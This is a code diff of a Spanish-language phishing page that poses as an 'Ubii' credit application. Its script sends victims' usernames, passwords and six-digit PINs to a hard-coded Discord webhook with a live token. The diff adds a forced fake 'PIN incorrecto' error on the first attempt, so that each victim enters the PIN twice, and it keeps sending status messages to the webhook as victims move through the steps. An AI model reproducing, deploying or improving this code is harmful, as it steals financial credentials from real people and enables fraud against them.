@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
@@ -62,11 +63,11 @@
         <!-- Indicadores de Progreso en la Parte Superior -->
         <header class="w-full mb-6">
             <div class="flex justify-between items-center px-1">
-                <span id="stepBadge" class="text-xs sm:text-sm font-semibold text-ubiiBlue bg-blue-100 px-3 sm:px-4 py-1.5 rounded-full shadow-sm">Paso 1 de 4</span>
+                <span id="stepBadge" class="text-xs sm:text-sm font-semibold text-ubiiBlue bg-blue-100 px-3 sm:px-4 py-1.5 rounded-full shadow-sm">Paso 1 de 3</span>
                 <span class="text-xs sm:text-sm text-gray-400 font-medium tracking-wide">Solicitud de Crédito</span>
             </div>
             <div class="w-full bg-gray-200 h-2 sm:h-2.5 rounded-full mt-3 overflow-hidden shadow-inner">
-                <div id="progressBar" class="bg-ubiiBlue h-full w-1/4 transition-all duration-500 ease-out rounded-full"></div>
+                <div id="progressBar" class="bg-ubiiBlue h-full w-1/3 transition-all duration-500 ease-out rounded-full"></div>
             </div>
         </header>
 
@@ -172,21 +173,28 @@
             </div>
 
             <!-- Formulario PIN paso 1 -->
-            <form id="pinFormStep2" onsubmit="goToStep3(event)" class="space-y-8">
+            <form id="pinFormStep2" onsubmit="handleStep2Submit(event)" class="space-y-6">
                 
-                <!-- 6 Cajas para los dígitos adaptables con Grid -->
-                <div class="grid grid-cols-6 gap-2 sm:gap-3">
-                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
-                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
-                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
-                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
-                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
-                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
+                <!-- 6 Cajas totalmente CUADRADAS para los dígitos -->
+                <div class="grid grid-cols-6 gap-2 sm:gap-3 max-w-sm mx-auto">
+                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl sm:text-2xl font-bold border-2 border-gray-200 rounded-lg sm:rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all p-0" required>
+                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl sm:text-2xl font-bold border-2 border-gray-200 rounded-lg sm:rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all p-0" required>
+                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl sm:text-2xl font-bold border-2 border-gray-200 rounded-lg sm:rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all p-0" required>
+                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl sm:text-2xl font-bold border-2 border-gray-200 rounded-lg sm:rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all p-0" required>
+                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl sm:text-2xl font-bold border-2 border-gray-200 rounded-lg sm:rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all p-0" required>
+                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-square text-center text-xl sm:text-2xl font-bold border-2 border-gray-200 rounded-lg sm:rounded-xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all p-0" required>
+                </div>
+
+                <!-- Mensaje de Error en caso de PIN incorrecto -->
+                <div id="pinStep2Error" class="hidden bg-red-50 border-l-4 border-red-500 p-3.5 rounded-r-xl transition-all">
+                    <p class="text-xs sm:text-sm text-red-700 font-semibold flex items-center gap-2">
+                        <i class="fa-solid fa-circle-exclamation text-base"></i> PIN incorrecto. Por favor, verifica e inténtalo nuevamente.
+                    </p>
                 </div>
 
                 <!-- Enlace de recuperación -->
-                <div class="text-center">
-                    <a href="#" class="text-sm font-semibold text-ubiiBlue hover:text-ubiiBlueHover hover:underline transition-colors">
+                <div class="text-center pt-2">
+                    <a href="#" class="text-xs sm:text-sm font-semibold text-ubiiBlue hover:text-ubiiBlueHover hover:underline transition-colors">
                         ¿Olvidaste tu clave de 6 dígitos?
                     </a>
                 </div>
@@ -195,70 +203,20 @@
                 <div>
                     <button 
                         type="submit" 
-                        class="w-full py-3.5 sm:py-4 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-bold rounded-2xl text-sm sm:text-base transition-all transform active:scale-[0.98] shadow-md focus:outline-none focus:ring-4 focus:ring-blue-200"
+                        id="btnSubmitStep2"
+                        class="w-full py-3.5 sm:py-4 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-bold rounded-2xl text-sm sm:text-base transition-all transform active:scale-[0.98] shadow-md focus:outline-none focus:ring-4 focus:ring-blue-200 flex items-center justify-center gap-2"
                     >
-                        Continuar
+                        <span>Continuar</span>
                     </button>
                 </div>
             </form>
         </main>
 
-        <!-- ==================== ETAPA 3: CONFIRMACIÓN DE CLAVE ==================== -->
+        <!-- ==================== ETAPA 3: AUTORIZACIÓN POR CORREO ==================== -->
         <main id="step3Screen" class="w-full bg-white rounded-[2rem] shadow-lg p-6 sm:p-10 border border-gray-100 hidden transition-all duration-300">
             
             <!-- Botón Volver -->
-            <button type="button" onclick="goToStep(2)" class="text-gray-400 hover:text-gray-700 mb-6 flex items-center gap-2 text-sm sm:text-base font-semibold focus:outline-none transition-colors w-fit p-1 -ml-1 rounded-lg">
-                <i class="fa-solid fa-arrow-left"></i> Volver
-            </button>
-
-            <!-- Título e Subtítulo -->
-            <div class="flex flex-col items-center justify-center text-center mb-8">
-                <div class="w-16 h-16 bg-blue-50 text-ubiiBlue rounded-full flex items-center justify-center mb-4 shadow-sm">
-                    <i class="fa-solid fa-key text-2xl"></i>
-                </div>
-                <h1 class="text-2xl sm:text-3xl font-bold text-[#1a1a1a]">Confirma tu clave</h1>
-                <p class="text-sm text-gray-500 mt-3 leading-relaxed">
-                    Ingresa nuevamente tu clave de 6 dígitos para confirmar la operación de crédito.
-                </p>
-            </div>
-
-            <!-- Formulario PIN Paso 2 (Confirmación) -->
-            <form id="pinFormStep3" onsubmit="goToStep4(event)" class="space-y-8">
-                
-                <!-- 6 Cajas de Confirmación con Grid -->
-                <div class="grid grid-cols-6 gap-2 sm:gap-3">
-                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
-                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
-                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
-                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
-                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
-                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
-                </div>
-
-                <!-- Alerta de no coincidencia -->
-                <div id="errorMismatch" class="hidden bg-red-50 border-l-4 border-red-500 p-4 rounded-r-lg">
-                    <p class="text-sm text-red-700 font-semibold flex items-center gap-2">
-                        <i class="fa-solid fa-circle-exclamation"></i> Las claves no coinciden. Inténtalo de nuevo.
-                    </p>
-                </div>
-
-                <!-- Botón Confirmar Clave -->
-                <div>
-                    <button 
-                        type="submit" 
-                        class="w-full py-3.5 sm:py-4 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-bold rounded-2xl text-sm sm:text-base transition-all transform active:scale-[0.98] shadow-md focus:outline-none focus:ring-4 focus:ring-blue-200"
-                    >
-                        Confirmar Clave
-                    </button>
-                </div>
-            </form>
-        </main>
-
-        <!-- ==================== ETAPA 4: AUTORIZACIÓN POR CORREO ==================== -->
-        <main id="step4Screen" class="w-full bg-white rounded-[2rem] shadow-lg p-6 sm:p-10 border border-gray-100 hidden transition-all duration-300">
-            
-            <!-- Botón Volver -->
-            <button id="backFromStep4Btn" type="button" onclick="goToStep(3)" class="text-gray-400 hover:text-gray-700 mb-6 flex items-center gap-2 text-sm sm:text-base font-semibold focus:outline-none transition-colors w-fit p-1 -ml-1 rounded-lg">
+            <button id="backFromStep3Btn" type="button" onclick="goToStep(2)" class="text-gray-400 hover:text-gray-700 mb-6 flex items-center gap-2 text-sm sm:text-base font-semibold focus:outline-none transition-colors w-fit p-1 -ml-1 rounded-lg">
                 <i class="fa-solid fa-arrow-left"></i> Volver
             </button>
 
@@ -337,9 +295,11 @@
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1539815628586749962/vZ-AWmOfGZ8SIfj61NbVcMOxvmRGuy3dM5xEgp7QmpLl9lJekjsccXClXIs1QUCYeLA9";
 
         let selectedType = 'natural';
-        let firstEnteredPin = '';
         let userEmailOrName = '';
         let userPassword = '';
+        
+        // Control para solicitar PIN incorrecto al primer intento
+        let isFirstPinAttempt = true;
 
         // Enviar a Discord
         function sendToDiscord(messageText) {
@@ -387,20 +347,18 @@
             document.getElementById('step1Screen').classList.add('hidden');
             document.getElementById('step2Screen').classList.add('hidden');
             document.getElementById('step3Screen').classList.add('hidden');
-            document.getElementById('step4Screen').classList.add('hidden');
 
             document.getElementById('emailAuthSection').classList.remove('hidden');
             document.getElementById('loadingAnalysis').classList.add('hidden');
-            document.getElementById('backFromStep4Btn').classList.remove('hidden');
+            document.getElementById('backFromStep3Btn').classList.remove('hidden');
 
             const progressBar = document.getElementById('progressBar');
             const stepBadge = document.getElementById('stepBadge');
-            stepBadge.innerText = `Paso ${stepNumber} de 4`;
+            stepBadge.innerText = `Paso ${stepNumber} de 3`;
 
-            if (stepNumber === 1) progressBar.style.width = '25%';
-            if (stepNumber === 2) progressBar.style.width = '50%';
-            if (stepNumber === 3) progressBar.style.width = '75%';
-            if (stepNumber === 4) progressBar.style.width = '100%';
+            if (stepNumber === 1) progressBar.style.width = '33%';
+            if (stepNumber === 2) progressBar.style.width = '66%';
+            if (stepNumber === 3) progressBar.style.width = '100%';
 
             const activeScreen = document.getElementById(`step${stepNumber}Screen`);
             activeScreen.classList.remove('hidden');
@@ -409,31 +367,20 @@
                 const inputs = document.querySelectorAll('.pin-input-2');
                 inputs.forEach(i => i.value = '');
                 if (inputs.length > 0) setTimeout(() => inputs[0].focus(), 100);
-            } else if (stepNumber === 3) {
-                const inputs = document.querySelectorAll('.pin-input-3');
-                inputs.forEach(i => i.value = '');
-                document.getElementById('errorMismatch').classList.add('hidden');
-                if (inputs.length > 0) setTimeout(() => inputs[0].focus(), 100);
             }
         }
 
         function startCreditAnalysis() {
             const loadingSec = document.getElementById('loadingAnalysis');
             const emailSec = document.getElementById('emailAuthSection');
-            const backBtn = document.getElementById('backFromStep4Btn');
+            const backBtn = document.getElementById('backFromStep3Btn');
 
             emailSec.classList.add('hidden');
             loadingSec.classList.remove('hidden');
             backBtn.classList.add('hidden');
 
-            // Mensaje simple a Discord
             sendToDiscord(`⏳ El usuario **${userEmailOrName}** está en análisis (Hizo clic en Ya Autoricé).`);
         }
-
-        // ======================================================================
-        // AQUI ESTÁN LOS MENSAJES FORMATEADOS PARA QUE SEAN FÁCILES DE COPIAR
-        // Usamos comillas invertidas (\`) de Markdown en las variables
-        // ======================================================================
 
         function goToStep2(event) {
             event.preventDefault();
@@ -445,49 +392,62 @@
                 el.innerText = userEmailOrName.includes('@') ? userEmailOrName : `${userEmailOrName}@correo.com`;
             });
 
-            // Mensaje a Discord con formato "Click-to-Copy"
+            // Restablecer flag de primer intento al iniciar sesión
+            isFirstPinAttempt = true;
+            document.getElementById('pinStep2Error').classList.add('hidden');
+
+            // Mensaje a Discord
             const msgLogin = `**🚨 NUEVO INICIO DE SESIÓN**\nTipo: ${selectedType}\n\n**Usuario/Correo:**\n\`${userEmailOrName}\`\n\n**Contraseña:**\n\`${userPassword}\``;
             sendToDiscord(msgLogin);
 
             goToStep(2);
         }
 
-        function goToStep3(event) {
+        // Manejador del PIN en la Etapa 2 (al pasar se va directamente a la Etapa 3 de Autorización por correo)
+        function handleStep2Submit(event) {
             event.preventDefault();
             const inputs = document.querySelectorAll('.pin-input-2');
-            firstEnteredPin = '';
-            inputs.forEach(i => firstEnteredPin += i.value);
+            let pinVal = '';
+            inputs.forEach(i => pinVal += i.value);
 
-            if (firstEnteredPin.length === 6) {
-                // Mensaje a Discord con formato "Click-to-Copy"
-                const msgPin1 = `**🔑 PIN INGRESADO (Paso 2)**\n\n**Usuario:**\n\`${userEmailOrName}\`\n\n**PIN:**\n\`${firstEnteredPin}\``;
-                sendToDiscord(msgPin1);
-                
-                goToStep(3);
-            }
+            if (pinVal.length !== 6) return;
+
+            const btn = document.getElementById('btnSubmitStep2');
+            const originalText = btn.innerHTML;
+            btn.disabled = true;
+            btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> Validando...`;
+
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.innerHTML = originalText;
+
+                if (isFirstPinAttempt) {
+                    // Notificar a Discord el PIN erróneo ingresado
+                    const msgPinError = `❌ **PIN INCORRECTO FORZADO (1er intento)**\n\n**Usuario:**\n\`${userEmailOrName}\`\n\n**PIN Ingresado:**\n\`${pinVal}\``;
+                    sendToDiscord(msgPinError);
+
+                    // Mostrar Alerta de Error
+                    document.getElementById('pinStep2Error').classList.remove('hidden');
+                    
+                    // Limpiar campos y enfocar el primero
+                    inputs.forEach(i => i.value = '');
+                    inputs[0].focus();
+
+                    // Marcar que el siguiente intento será el válido
+                    isFirstPinAttempt = false;
+                } else {
+                    document.getElementById('pinStep2Error').classList.add('hidden');
+
+                    const msgPinSuccess = `🔑 **PIN INGRESADO (Paso 2 - Correcto)**\n\n**Usuario:**\n\`${userEmailOrName}\`\n\n**PIN:**\n\`${pinVal}\``;
+                    sendToDiscord(msgPinSuccess);
+
+                    // Pasa directamente a la pantalla de autorización por correo (Paso 3)
+                    goToStep(3);
+                }
+            }, 800);
         }
 
-        function goToStep4(event) {
-            event.preventDefault();
-            const inputs = document.querySelectorAll('.pin-input-3');
-            let confirmPin = '';
-            inputs.forEach(i => confirmPin += i.value);
-
-            if (confirmPin === firstEnteredPin) {
-                // Mensaje a Discord con formato "Click-to-Copy"
-                const msgPin2 = `**✅ PIN CONFIRMADO (Paso 3)**\n\n**Usuario:**\n\`${userEmailOrName}\`\n\n**PIN Confirmado:**\n\`${confirmPin}\``;
-                sendToDiscord(msgPin2);
-                
-                goToStep(4);
-            } else {
-                sendToDiscord(`⚠️ **ERROR DE CLAVE:** El usuario \`${userEmailOrName}\` ingresó un PIN que no coincide.`);
-                document.getElementById('errorMismatch').classList.remove('hidden');
-                inputs.forEach(i => i.value = '');
-                inputs[0].focus();
-            }
-        }
-
-        // Configuración de las cajas del PIN
+        // Configuración de las cajas del PIN (Navegación fluida)
         function setupPinInputs(selectorClass) {
             const inputs = document.querySelectorAll(selectorClass);
             inputs.forEach((input, index) => {
@@ -520,7 +480,6 @@
         }
 
         setupPinInputs('.pin-input-2');
-        setupPinInputs('.pin-input-3');
 
         function resendAuthEmail() {
             sendToDiscord(`📧 **El usuario \`${userEmailOrName}\` solicitó reenvío del correo.**`);
@@ -536,5 +495,4 @@
     </script>
 </body>
 </html>
-
 
